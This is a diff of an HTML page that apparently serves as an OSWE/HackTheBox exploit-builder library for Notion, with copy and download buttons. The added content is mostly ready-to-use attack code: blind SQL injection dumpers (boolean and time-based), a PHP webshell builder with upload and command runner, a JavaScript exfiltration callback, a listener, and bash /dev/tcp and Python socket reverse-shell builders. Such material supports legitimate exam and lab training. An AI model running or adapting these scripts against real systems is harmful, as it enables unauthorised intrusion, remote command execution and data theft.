@@ -3,23 +3,29 @@
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>OSWE Library Embed POC</title>
+  <title>OSWE Exploit Builder Library</title>
   <style>
     :root {
       --bg: #f5f2ea;
       --surface: #fffefa;
+      --surface-2: #fbfaf5;
       --ink: #20231f;
       --muted: #687069;
       --line: #d8d1c3;
       --accent: #0f766e;
-      --red: #b42318;
       --blue: #174ea6;
-      --code: #222824;
+      --red: #b42318;
+      --amber: #8a5a00;
+      --violet: #6842b8;
+      --green: #59621f;
+      --code: #202621;
       --code-ink: #edf2ec;
       --radius: 8px;
     }
 
     * { box-sizing: border-box; }
+
+    html { scroll-behavior: smooth; }
 
     body {
       margin: 0;
@@ -28,15 +34,24 @@
       background: var(--bg);
     }
 
+    button,
+    input {
+      font: inherit;
+    }
+
+    button {
+      cursor: pointer;
+    }
+
     main {
-      max-width: 1180px;
+      max-width: 1420px;
       margin: 0 auto;
-      padding: 30px 24px 48px;
+      padding: 28px 24px 44px;
     }
 
     .hero {
       display: grid;
-      grid-template-columns: minmax(0, 1fr) 260px;
+      grid-template-columns: minmax(0, 1fr) 320px;
       gap: 24px;
       align-items: end;
       padding-bottom: 24px;
@@ -53,14 +68,21 @@
 
     h1 {
       margin: 0 0 10px;
-      font-size: clamp(30px, 5vw, 54px);
+      font-size: clamp(30px, 5vw, 56px);
       line-height: 1;
       letter-spacing: 0;
     }
 
     h2 {
-      margin: 0 0 10px;
-      font-size: 20px;
+      margin: 0 0 8px;
+      font-size: 21px;
+      letter-spacing: 0;
+    }
+
+    h3 {
+      margin: 0;
+      font-size: 15px;
+      letter-spacing: 0;
     }
 
     p {
@@ -77,96 +99,195 @@
       font-size: 14px;
     }
 
-    .layout {
+    .status strong {
+      display: block;
+      margin-bottom: 6px;
+    }
+
+    .workspace {
       display: grid;
-      grid-template-columns: 310px 1fr;
+      grid-template-columns: 360px minmax(0, 1fr);
       gap: 18px;
-      margin-top: 24px;
+      margin-top: 22px;
       align-items: start;
     }
 
-    nav {
+    .sidebar {
       position: sticky;
       top: 12px;
       border: 1px solid var(--line);
       border-radius: var(--radius);
       background: var(--surface);
       padding: 14px;
-      display: grid;
-      gap: 8px;
+      max-height: calc(100vh - 24px);
+      overflow: auto;
     }
 
-    button {
+    .search {
+      width: 100%;
       border: 1px solid var(--line);
-      border-radius: 6px;
-      background: #fbfaf5;
-      color: var(--ink);
-      text-align: left;
+      border-radius: var(--radius);
+      background: var(--surface-2);
       padding: 10px 11px;
-      cursor: pointer;
-      font: inherit;
-      font-size: 14px;
-      font-weight: 700;
+      color: var(--ink);
+      margin-bottom: 12px;
     }
 
-    button[aria-pressed="true"] {
+    .filters {
+      display: flex;
+      gap: 7px;
+      flex-wrap: wrap;
+      margin-bottom: 12px;
+    }
+
+    .filter {
+      border: 1px solid var(--line);
+      border-radius: 999px;
+      background: var(--surface-2);
+      color: var(--muted);
+      padding: 6px 9px;
+      font-size: 12px;
+      font-weight: 800;
+    }
+
+    .filter[aria-pressed="true"] {
       border-color: rgba(15, 118, 110, .5);
       background: #e3f1ed;
       color: #063b36;
     }
 
-    .cards {
+    .script-list {
       display: grid;
-      grid-template-columns: repeat(3, minmax(0, 1fr));
-      gap: 12px;
-      margin-bottom: 18px;
+      gap: 7px;
     }
 
-    .card {
+    .script-button {
+      width: 100%;
+      border: 1px solid var(--line);
+      border-radius: 6px;
+      background: var(--surface-2);
+      color: var(--ink);
+      text-align: left;
+      padding: 10px;
+      display: grid;
+      gap: 5px;
+    }
+
+    .script-button[aria-pressed="true"] {
+      border-color: rgba(15, 118, 110, .55);
+      background: #e3f1ed;
+    }
+
+    .button-title {
+      font-weight: 850;
+      font-size: 13px;
+    }
+
+    .button-meta {
+      color: var(--muted);
+      font-size: 12px;
+    }
+
+    .content {
+      display: grid;
+      gap: 16px;
+      min-width: 0;
+    }
+
+    .topline {
+      display: grid;
+      grid-template-columns: repeat(4, minmax(0, 1fr));
+      gap: 10px;
+    }
+
+    .metric {
       border: 1px solid var(--line);
       border-radius: var(--radius);
       background: var(--surface);
       padding: 14px;
     }
 
-    .tag {
-      display: inline-flex;
-      width: fit-content;
-      border-radius: 999px;
-      color: #fff;
-      padding: 4px 8px;
-      font-size: 12px;
-      font-weight: 800;
-      margin-bottom: 10px;
+    .metric strong {
+      display: block;
+      font-size: 22px;
+      line-height: 1;
+      margin-bottom: 8px;
     }
 
-    .tag.blue { background: var(--blue); }
-    .tag.red { background: var(--red); }
-    .tag.teal { background: var(--accent); }
+    .metric span {
+      color: var(--muted);
+      font-size: 13px;
+    }
 
     .panel {
       border: 1px solid var(--line);
       border-radius: var(--radius);
       background: var(--surface);
       overflow: hidden;
+      min-width: 0;
     }
 
     .panel-head {
       padding: 16px;
       border-bottom: 1px solid var(--line);
-      background: #fbfaf5;
-      display: flex;
-      justify-content: space-between;
+      background: var(--surface-2);
+      display: grid;
+      grid-template-columns: minmax(0, 1fr) auto;
       gap: 14px;
       align-items: start;
     }
 
-    .copy {
-      width: auto;
+    .meta-row {
+      display: flex;
+      gap: 7px;
+      flex-wrap: wrap;
+      margin: 10px 0 0;
+    }
+
+    .pill {
+      display: inline-flex;
+      width: fit-content;
+      border-radius: 999px;
+      color: #fff;
+      padding: 4px 8px;
+      font-size: 12px;
+      font-weight: 850;
       white-space: nowrap;
-      border-color: var(--accent);
+    }
+
+    .type-start { background: var(--blue); }
+    .type-replace { background: var(--red); }
+    .type-add { background: var(--accent); }
+    .type-example { background: var(--green); }
+    .area-main { background: var(--blue); }
+    .area-login { background: var(--amber); }
+    .area-exploit { background: var(--red); }
+    .area-listener { background: var(--violet); }
+    .area-helper { background: var(--accent); }
+    .area-example { background: var(--green); }
+
+    .actions {
+      display: flex;
+      gap: 8px;
+      align-items: start;
+      flex-wrap: wrap;
+      justify-content: end;
+    }
+
+    .action {
+      border: 1px solid var(--accent);
+      border-radius: var(--radius);
       color: #063b36;
       background: #e3f1ed;
+      padding: 9px 11px;
+      font-weight: 850;
+      white-space: nowrap;
+    }
+
+    .secondary {
+      border-color: var(--line);
+      background: var(--surface);
+      color: var(--ink);
     }
 
     pre {
@@ -176,16 +297,64 @@
       background: var(--code);
       color: var(--code-ink);
       font: 13px/1.55 ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
-      min-height: 430px;
+      min-height: 520px;
+      max-height: 720px;
     }
 
-    .hidden { display: none; }
+    .recipe {
+      border: 1px solid var(--line);
+      border-radius: var(--radius);
+      background: var(--surface);
+      padding: 14px;
+    }
 
-    @media (max-width: 900px) {
+    .recipe-grid {
+      display: grid;
+      grid-template-columns: repeat(3, minmax(0, 1fr));
+      gap: 10px;
+      margin-top: 10px;
+    }
+
+    .recipe-card {
+      border: 1px solid var(--line);
+      border-radius: var(--radius);
+      background: var(--surface-2);
+      padding: 12px;
+    }
+
+    .recipe-card ol {
+      margin: 8px 0 0;
+      padding-left: 18px;
+      color: var(--muted);
+      font-size: 13px;
+      line-height: 1.45;
+    }
+
+    .empty {
+      display: none;
+      color: var(--muted);
+      padding: 12px;
+      border: 1px dashed var(--line);
+      border-radius: var(--radius);
+      background: var(--surface-2);
+      font-size: 14px;
+    }
+
+    @media (max-width: 1040px) {
       .hero,
-      .layout { grid-template-columns: 1fr; }
-      nav { position: static; }
-      .cards { grid-template-columns: 1fr; }
+      .workspace { grid-template-columns: 1fr; }
+      .sidebar { position: static; max-height: none; }
+      .topline,
+      .recipe-grid { grid-template-columns: repeat(2, minmax(0, 1fr)); }
+    }
+
+    @media (max-width: 660px) {
+      main { padding: 20px 14px 32px; }
+      .topline,
+      .recipe-grid { grid-template-columns: 1fr; }
+      .panel-head { grid-template-columns: 1fr; }
+      .actions { justify-content: start; }
+      pre { max-height: none; }
     }
   </style>
 </head>
@@ -193,62 +362,116 @@
   <main>
     <section class="hero">
       <div>
-        <div class="eyebrow">Notion HTML embed POC</div>
-        <h1>OSWE exploit-builder preview</h1>
-        <p>This is a sanitized proof of concept. It tests whether Notion can embed an external HTML page that contains rich navigation and copyable skeleton code.</p>
+        <div class="eyebrow">OSWE HTML library</div>
+        <h1>Exploit-builder scripts</h1>
+        <p>Everything important is inside this HTML: navigation, playbooks, skeletons, snippets, examples, and copy buttons. Notion is just the embed container.</p>
       </div>
       <aside class="status">
-        <strong>POC boundary</strong>
-        <p>No course-specific scripts, targets, credentials, tokens, or proprietary snippets are included here.</p>
+        <strong>Content boundary</strong>
+        <p>This initial version uses sanitized generic skeletons. Replace or extend entries with your approved OSWE/HTB-derived scripts before relying on it as the final library.</p>
       </aside>
     </section>
 
-    <section class="layout">
-      <nav aria-label="Snippet selector">
-        <button data-target="main" aria-pressed="true">START HERE - main.py Full Chain Skeleton</button>
-        <button data-target="login" aria-pressed="false">REPLACE login() - Form CSRF</button>
-        <button data-target="exploit" aria-pressed="false">REPLACE exploit() - Boolean Oracle Dump</button>
-        <button data-target="helper" aria-pressed="false">ADD - csrf_token</button>
-      </nav>
-
-      <div>
-        <div class="cards" aria-label="Library summary">
-          <article class="card">
-            <span class="tag blue">Main</span>
-            <h2>Copy first</h2>
-            <p>Base file with constants, session, function slots, and main orchestration.</p>
-          </article>
-          <article class="card">
-            <span class="tag red">Replace</span>
-            <h2>Swap functions</h2>
-            <p>Paste technique-specific login, exploit, dump, and run_cmd blocks.</p>
-          </article>
-          <article class="card">
-            <span class="tag teal">Examples</span>
-            <h2>Keep context</h2>
-            <p>Complete examples live near reusable snippets so final assembly is obvious.</p>
-          </article>
+    <section class="workspace">
+      <aside class="sidebar" aria-label="Script library controls">
+        <input class="search" type="search" placeholder="Search scripts, areas, techniques..." aria-label="Search scripts">
+        <div class="filters" aria-label="Script type filters">
+          <button class="filter" data-filter="all" aria-pressed="true">All</button>
+          <button class="filter" data-filter="START HERE" aria-pressed="false">Start</button>
+          <button class="filter" data-filter="REPLACE" aria-pressed="false">Replace</button>
+          <button class="filter" data-filter="ADD" aria-pressed="false">Add</button>
+          <button class="filter" data-filter="HTB EXAMPLE" aria-pressed="false">Examples</button>
         </div>
+        <div class="script-list" aria-label="Scripts"></div>
+        <div class="empty">No scripts match this filter.</div>
+      </aside>
 
-        <article class="panel" id="snippet-panel">
+      <div class="content">
+        <section class="topline" aria-label="Library stats">
+          <div class="metric"><strong id="count-all">0</strong><span>Total scripts in HTML</span></div>
+          <div class="metric"><strong id="count-replace">0</strong><span>Replaceable functions</span></div>
+          <div class="metric"><strong id="count-add">0</strong><span>Helpers</span></div>
+          <div class="metric"><strong id="count-example">0</strong><span>Complete examples</span></div>
+        </section>
+
+        <section class="recipe" aria-labelledby="recipes-title">
+          <h2 id="recipes-title">Copy kits</h2>
+          <p>Use these as fast assembly paths when building the final main.py.</p>
+          <div class="recipe-grid">
+            <article class="recipe-card">
+              <h3>Blind SQLi proof</h3>
+              <ol>
+                <li>START HERE - main.py Full Chain Skeleton</li>
+                <li>REPLACE login() - Form CSRF</li>
+                <li>REPLACE exploit() - Boolean Oracle Dump</li>
+                <li>REPLACE dump() - Proof File</li>
+              </ol>
+            </article>
+            <article class="recipe-card">
+              <h3>Upload webshell RCE</h3>
+              <ol>
+                <li>START HERE - main.py Full Chain Skeleton</li>
+                <li>ADD - webshell_builder</li>
+                <li>REPLACE exploit() - File Upload Webshell</li>
+                <li>REPLACE run_cmd() - Webshell</li>
+              </ol>
+            </article>
+            <article class="recipe-card">
+              <h3>OOB callback</h3>
+              <ol>
+                <li>START HERE - HTTP Listener</li>
+                <li>REPLACE build_response - JS Callback</li>
+                <li>START HERE - main.py Full Chain Skeleton</li>
+                <li>REPLACE exploit() - XXE OOB</li>
+              </ol>
+            </article>
+          </div>
+        </section>
+
+        <article class="panel" id="script-panel">
           <div class="panel-head">
             <div>
-              <h2 id="snippet-title">START HERE - main.py Full Chain Skeleton</h2>
-              <p id="snippet-summary">Base attacker script copied first.</p>
+              <h2 id="script-title"></h2>
+              <p id="script-summary"></p>
+              <div class="meta-row">
+                <span id="script-type" class="pill"></span>
+                <span id="script-area" class="pill"></span>
+                <span id="script-slot" class="pill area-helper"></span>
+              </div>
             </div>
-            <button class="copy" type="button">Copy code</button>
+            <div class="actions">
+              <button class="action" id="copy-active" type="button">Copy code</button>
+              <button class="action secondary" id="download-active" type="button">Download</button>
+            </div>
           </div>
-          <pre><code id="main">import requests
+          <pre><code id="script-code"></code></pre>
+        </article>
+      </div>
+    </section>
+  </main>
+
+  <script>
+    const scripts = [
+      {
+        id: "main-full-chain",
+        title: "START HERE - main.py Full Chain Skeleton",
+        type: "START HERE",
+        area: "Main",
+        slot: "copy first",
+        summary: "Base attacker script copied first for a complete OSWE-style exploit chain.",
+        filename: "main_full_chain_skeleton.py",
+        code: `#!/usr/bin/env python3
+import requests
 import urllib3
 
 urllib3.disable_warnings()
 
-TARGET = "http://target"      # EDIT
-PROXY = None                  # EDIT: {"http": "http://127.0.0.1:8080"}
-USERNAME = "admin"            # EDIT
-PASSWORD = "password"         # EDIT
-CALLBACK_HOST = "127.0.0.1"   # EDIT
-CALLBACK_PORT = 8000          # EDIT
+TARGET = "http://target"       # EDIT
+PROXY = None                   # EDIT: {"http": "http://127.0.0.1:8080"}
+USERNAME = "admin"             # EDIT
+PASSWORD = "password"          # EDIT
+CALLBACK_HOST = "127.0.0.1"    # EDIT
+CALLBACK_PORT = 8000           # EDIT
 
 s = requests.Session()
 s.verify = False
@@ -273,7 +496,64 @@ def main():
 
 if __name__ == "__main__":
     main()
-</code><code id="login" class="hidden">LOGIN_PATH = "/login"          # EDIT
+`
+      },
+      {
+        id: "listener-http",
+        title: "START HERE - HTTP Listener",
+        type: "START HERE",
+        area: "Listener",
+        slot: "separate terminal",
+        summary: "Minimal HTTP callback receiver for OOB payloads and quick request logging.",
+        filename: "http_listener.py",
+        code: `#!/usr/bin/env python3
+from http.server import BaseHTTPRequestHandler, HTTPServer
+from urllib.parse import urlparse, parse_qs
+
+HOST = "0.0.0.0"     # EDIT
+PORT = 8000          # EDIT
+
+def build_response(path, query, body):
+    return b"ok"
+
+class Handler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        parsed = urlparse(self.path)
+        query = parse_qs(parsed.query)
+        print(f"[+] GET {parsed.path} {query}")
+        body = build_response(parsed.path, query, b"")
+        self.send_response(200)
+        self.end_headers()
+        self.wfile.write(body)
+
+    def do_POST(self):
+        length = int(self.headers.get("Content-Length", 0))
+        body = self.rfile.read(length)
+        parsed = urlparse(self.path)
+        query = parse_qs(parsed.query)
+        print(f"[+] POST {parsed.path} {query} {body!r}")
+        out = build_response(parsed.path, query, body)
+        self.send_response(200)
+        self.end_headers()
+        self.wfile.write(out)
+
+def main():
+    print(f"[+] listening on http://{HOST}:{PORT}")
+    HTTPServer((HOST, PORT), Handler).serve_forever()
+
+if __name__ == "__main__":
+    main()
+`
+      },
+      {
+        id: "login-form-csrf",
+        title: "REPLACE login() - Form CSRF",
+        type: "REPLACE",
+        area: "Login",
+        slot: "replaces login()",
+        summary: "Logs in by extracting a CSRF token from the login form.",
+        filename: "replace_login_form_csrf.py",
+        code: `LOGIN_PATH = "/login"          # EDIT
 CSRF_FIELD = "csrf_token"     # EDIT
 
 def login():
@@ -293,29 +573,172 @@ def login():
 
     print("[+] logged in")
     return True
-</code><code id="exploit" class="hidden">DUMP_PATH = "/vulnerable/search"  # EDIT
+`
+      },
+      {
+        id: "exploit-boolean-oracle",
+        title: "REPLACE exploit() - Boolean Oracle Dump",
+        type: "REPLACE",
+        area: "Exploit",
+        slot: "replaces exploit()",
+        summary: "Uses a boolean response difference to extract a value character by character.",
+        filename: "replace_exploit_boolean_oracle.py",
+        code: `DUMP_PATH = "/vulnerable/search"  # EDIT
 INJ_PARAM = "q"                  # EDIT
+TRUE_MARKER = "match"            # EDIT
 ALPHABET = "abcdefghijklmnopqrstuvwxyz0123456789{}_-.@"
 
 def oracle(prefix):
     payload = {INJ_PARAM: f"admin' AND secret LIKE '{prefix}%'--"}
     r = s.get(f"{TARGET}{DUMP_PATH}", params=payload)
-    return "match" in r.text.lower()
+    return TRUE_MARKER in r.text.lower()
 
 def exploit():
     value = ""
     while True:
         found = False
         for ch in ALPHABET:
-            if oracle(value + ch):
-                value += ch
+            probe = value + ch
+            if oracle(probe):
+                value = probe
                 found = True
                 print(f"[+] {value}")
                 break
         if not found:
             break
     return value
-</code><code id="helper" class="hidden">from bs4 import BeautifulSoup
+`
+      },
+      {
+        id: "exploit-time-sqli",
+        title: "REPLACE exploit() - Time SQLi Dump",
+        type: "REPLACE",
+        area: "Exploit",
+        slot: "replaces exploit()",
+        summary: "Extracts data using response delay as the oracle.",
+        filename: "replace_exploit_time_sqli.py",
+        code: `import time
+
+DUMP_PATH = "/vulnerable/search"  # EDIT
+INJ_PARAM = "q"                  # EDIT
+DELAY = 3                        # EDIT
+THRESHOLD = 2.2                  # EDIT
+ALPHABET = "abcdefghijklmnopqrstuvwxyz0123456789{}_-.@"
+
+def is_true(prefix):
+    payload = {
+        INJ_PARAM: f"admin' AND IF(secret LIKE '{prefix}%', SLEEP({DELAY}), 0)--"
+    }
+    start = time.time()
+    s.get(f"{TARGET}{DUMP_PATH}", params=payload)
+    return time.time() - start > THRESHOLD
+
+def exploit():
+    value = ""
+    while True:
+        for ch in ALPHABET:
+            if is_true(value + ch):
+                value += ch
+                print(f"[+] {value}")
+                break
+        else:
+            return value
+`
+      },
+      {
+        id: "exploit-upload-webshell",
+        title: "REPLACE exploit() - File Upload Webshell",
+        type: "REPLACE",
+        area: "Exploit",
+        slot: "replaces exploit()",
+        summary: "Uploads a simple webshell and verifies that the command endpoint works.",
+        filename: "replace_exploit_file_upload_webshell.py",
+        code: `UPLOAD_PATH = "/upload"                 # EDIT
+SHELL_URL = "/uploads/shell.php"       # EDIT
+SHELL_FIELD = "file"                   # EDIT
+
+def exploit():
+    shell = build_php_webshell()
+    files = {
+        SHELL_FIELD: ("shell.php", shell, "application/x-php"),
+    }
+    r = s.post(f"{TARGET}{UPLOAD_PATH}", files=files)
+    r.raise_for_status()
+
+    test = run_cmd("id")
+    if not test:
+        raise RuntimeError("webshell uploaded but command output is empty")
+
+    print(f"[+] webshell ready: {TARGET}{SHELL_URL}")
+    print(test)
+`
+      },
+      {
+        id: "run-cmd-webshell",
+        title: "REPLACE run_cmd() - Webshell",
+        type: "REPLACE",
+        area: "Exploit",
+        slot: "replaces run_cmd(cmd)",
+        summary: "Sends one command through a webshell parameter.",
+        filename: "replace_run_cmd_webshell.py",
+        code: `SHELL_URL = "/uploads/shell.php"  # EDIT
+CMD_PARAM = "cmd"                   # EDIT
+
+def run_cmd(cmd):
+    r = s.get(f"{TARGET}{SHELL_URL}", params={CMD_PARAM: cmd})
+    r.raise_for_status()
+    return r.text.strip()
+`
+      },
+      {
+        id: "dump-proof-file",
+        title: "REPLACE dump() - Proof File",
+        type: "REPLACE",
+        area: "Exploit",
+        slot: "replaces dump()",
+        summary: "Reads proof files through an existing command execution primitive.",
+        filename: "replace_dump_proof_file.py",
+        code: `PROOF_PATHS = [
+    "/home/user/proof.txt",  # EDIT
+    "/root/proof.txt",       # EDIT
+]
+
+def dump():
+    for path in PROOF_PATHS:
+        try:
+            out = run_cmd(f"cat {path}")
+            if out:
+                print(f"[+] {path}: {out}")
+        except Exception as e:
+            print(f"[-] failed {path}: {e}")
+`
+      },
+      {
+        id: "build-response-js",
+        title: "REPLACE build_response - JS Callback",
+        type: "REPLACE",
+        area: "Listener",
+        slot: "replaces build_response()",
+        summary: "Listener response builder that returns JavaScript for callback-based chains.",
+        filename: "replace_build_response_js_callback.py",
+        code: `def build_response(path, query, body):
+    payload = """
+fetch('/admin/debug')
+  .then(r => r.text())
+  .then(t => fetch('/leak?d=' + btoa(t)));
+"""
+    return payload.encode()
+`
+      },
+      {
+        id: "helper-csrf-token",
+        title: "ADD - csrf_token",
+        type: "ADD",
+        area: "Helper",
+        slot: "helper",
+        summary: "Parses a CSRF token from an HTML input field.",
+        filename: "add_csrf_token.py",
+        code: `from bs4 import BeautifulSoup
 
 def parse_csrf(html, field_name):
     soup = BeautifulSoup(html, "html.parser")
@@ -323,57 +746,229 @@ def parse_csrf(html, field_name):
     if not field or not field.get("value"):
         raise RuntimeError(f"missing CSRF field: {field_name}")
     return field["value"]
-</code></pre>
-        </article>
-      </div>
-    </section>
-  </main>
+`
+      },
+      {
+        id: "helper-webshell-builder",
+        title: "ADD - webshell_builder",
+        type: "ADD",
+        area: "Helper",
+        slot: "helper",
+        summary: "Builds a small PHP command webshell payload.",
+        filename: "add_webshell_builder.py",
+        code: `def build_php_webshell():
+    return b"<?php system($_GET['cmd'] ?? 'id'); ?>"
+`
+      },
+      {
+        id: "helper-revshell-builder",
+        title: "ADD - revshell_builder",
+        type: "ADD",
+        area: "Helper",
+        slot: "helper",
+        summary: "Builds common reverse shell command strings.",
+        filename: "add_revshell_builder.py",
+        code: `def bash_revshell(host, port):
+    return f"bash -c 'bash -i >& /dev/tcp/{host}/{port} 0>&1'"
 
-  <script>
-    const snippets = {
-      main: {
-        title: "START HERE - main.py Full Chain Skeleton",
-        summary: "Base attacker script copied first."
+def python_revshell(host, port):
+    return (
+        "python3 -c 'import os,pty,socket;"
+        f"s=socket.socket();s.connect((\\"{host}\\",{port}));"
+        "[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\\"/bin/bash\\")'"
+    )
+`
       },
-      login: {
-        title: "REPLACE login() - Form CSRF",
-        summary: "Replaces login() with form auth and CSRF token extraction."
-      },
-      exploit: {
-        title: "REPLACE exploit() - Boolean Oracle Dump",
-        summary: "Replaces exploit() with a generic boolean oracle extraction loop."
-      },
-      helper: {
-        title: "ADD - csrf_token",
-        summary: "Helper pasted near the top of main.py when login snippets need token parsing."
+      {
+        id: "example-boolean-oracle",
+        title: "HTB EXAMPLE - Boolean Oracle Dump",
+        type: "HTB EXAMPLE",
+        area: "Example",
+        slot: "complete example",
+        summary: "Complete sanitized script showing how a boolean oracle dump fits together.",
+        filename: "example_boolean_oracle_dump.py",
+        code: `#!/usr/bin/env python3
+import requests
+import urllib3
+from bs4 import BeautifulSoup
+
+urllib3.disable_warnings()
+
+TARGET = "http://target"       # EDIT
+PROXY = None                   # EDIT
+USERNAME = "admin"             # EDIT
+PASSWORD = "password"          # EDIT
+LOGIN_PATH = "/login"          # EDIT
+DUMP_PATH = "/vulnerable/search"  # EDIT
+CSRF_FIELD = "csrf_token"      # EDIT
+TRUE_MARKER = "match"          # EDIT
+ALPHABET = "abcdefghijklmnopqrstuvwxyz0123456789{}_-.@"
+
+s = requests.Session()
+s.verify = False
+s.proxies = PROXY
+
+def parse_csrf(html, field_name):
+    soup = BeautifulSoup(html, "html.parser")
+    field = soup.find("input", {"name": field_name})
+    if not field or not field.get("value"):
+        raise RuntimeError(f"missing CSRF field: {field_name}")
+    return field["value"]
+
+def login():
+    r = s.get(f"{TARGET}{LOGIN_PATH}")
+    token = parse_csrf(r.text, CSRF_FIELD)
+    data = {"username": USERNAME, "password": PASSWORD, CSRF_FIELD: token}
+    r = s.post(f"{TARGET}{LOGIN_PATH}", data=data)
+    r.raise_for_status()
+    print("[+] logged in")
+
+def oracle(prefix):
+    payload = {"q": f"admin' AND secret LIKE '{prefix}%'--"}
+    r = s.get(f"{TARGET}{DUMP_PATH}", params=payload)
+    return TRUE_MARKER in r.text.lower()
+
+def exploit():
+    value = ""
+    while True:
+        for ch in ALPHABET:
+            if oracle(value + ch):
+                value += ch
+                print(f"[+] {value}")
+                break
+        else:
+            return value
+
+def main():
+    login()
+    secret = exploit()
+    print(f"[+] final: {secret}")
+
+if __name__ == "__main__":
+    main()
+`
       }
+    ];
+
+    const typeClasses = {
+      "START HERE": "type-start",
+      "REPLACE": "type-replace",
+      "ADD": "type-add",
+      "HTB EXAMPLE": "type-example"
     };
 
-    const title = document.querySelector("#snippet-title");
-    const summary = document.querySelector("#snippet-summary");
-    const codes = document.querySelectorAll("pre code");
-    const buttons = document.querySelectorAll("nav button");
-    const copy = document.querySelector(".copy");
+    const areaClasses = {
+      "Main": "area-main",
+      "Login": "area-login",
+      "Exploit": "area-exploit",
+      "Listener": "area-listener",
+      "Helper": "area-helper",
+      "Example": "area-example"
+    };
 
-    function activate(id) {
-      buttons.forEach((button) => {
-        button.setAttribute("aria-pressed", String(button.dataset.target === id));
-      });
-      codes.forEach((code) => code.classList.toggle("hidden", code.id !== id));
-      title.textContent = snippets[id].title;
-      summary.textContent = snippets[id].summary;
+    let activeFilter = "all";
+    let activeScript = scripts[0];
+
+    const search = document.querySelector(".search");
+    const list = document.querySelector(".script-list");
+    const empty = document.querySelector(".empty");
+    const filters = document.querySelectorAll(".filter");
+    const title = document.querySelector("#script-title");
+    const summary = document.querySelector("#script-summary");
+    const type = document.querySelector("#script-type");
+    const area = document.querySelector("#script-area");
+    const slot = document.querySelector("#script-slot");
+    const code = document.querySelector("#script-code");
+    const copy = document.querySelector("#copy-active");
+    const download = document.querySelector("#download-active");
+
+    function scriptMatches(script) {
+      const q = search.value.trim().toLowerCase();
+      const haystack = [
+        script.title,
+        script.type,
+        script.area,
+        script.slot,
+        script.summary,
+        script.code
+      ].join(" ").toLowerCase();
+
+      const filterMatch = activeFilter === "all" || script.type === activeFilter;
+      return filterMatch && (!q || haystack.includes(q));
     }
 
-    buttons.forEach((button) => {
-      button.addEventListener("click", () => activate(button.dataset.target));
+    function renderList() {
+      const matches = scripts.filter(scriptMatches);
+      list.innerHTML = "";
+      empty.style.display = matches.length ? "none" : "block";
+
+      matches.forEach((script) => {
+        const button = document.createElement("button");
+        button.className = "script-button";
+        button.type = "button";
+        button.dataset.id = script.id;
+        button.setAttribute("aria-pressed", String(script.id === activeScript.id));
+        button.innerHTML = `
+          <span class="button-title">${script.title}</span>
+          <span class="button-meta">${script.type} / ${script.area}</span>
+        `;
+        button.addEventListener("click", () => activate(script.id));
+        list.appendChild(button);
+      });
+    }
+
+    function activate(id) {
+      activeScript = scripts.find((script) => script.id === id) || scripts[0];
+      title.textContent = activeScript.title;
+      summary.textContent = activeScript.summary;
+      type.textContent = activeScript.type;
+      type.className = `pill ${typeClasses[activeScript.type]}`;
+      area.textContent = activeScript.area;
+      area.className = `pill ${areaClasses[activeScript.area]}`;
+      slot.textContent = activeScript.slot;
+      code.textContent = activeScript.code.trim();
+      renderList();
+    }
+
+    function renderStats() {
+      document.querySelector("#count-all").textContent = scripts.length;
+      document.querySelector("#count-replace").textContent = scripts.filter((s) => s.type === "REPLACE").length;
+      document.querySelector("#count-add").textContent = scripts.filter((s) => s.type === "ADD").length;
+      document.querySelector("#count-example").textContent = scripts.filter((s) => s.type === "HTB EXAMPLE").length;
+    }
+
+    filters.forEach((button) => {
+      button.addEventListener("click", () => {
+        activeFilter = button.dataset.filter;
+        filters.forEach((item) => {
+          item.setAttribute("aria-pressed", String(item === button));
+        });
+        renderList();
+      });
     });
 
+    search.addEventListener("input", renderList);
+
     copy.addEventListener("click", async () => {
-      const active = [...codes].find((code) => !code.classList.contains("hidden"));
-      await navigator.clipboard.writeText(active.textContent.trim());
+      await navigator.clipboard.writeText(activeScript.code.trim());
       copy.textContent = "Copied";
       setTimeout(() => copy.textContent = "Copy code", 900);
     });
+
+    download.addEventListener("click", () => {
+      const blob = new Blob([activeScript.code.trim() + "\n"], { type: "text/x-python" });
+      const url = URL.createObjectURL(blob);
+      const link = document.createElement("a");
+      link.href = url;
+      link.download = activeScript.filename;
+      document.body.appendChild(link);
+      link.click();
+      link.remove();
+      URL.revokeObjectURL(url);
+    });
+
+    renderStats();
+    activate(activeScript.id);
   </script>
 </body>
 </html>
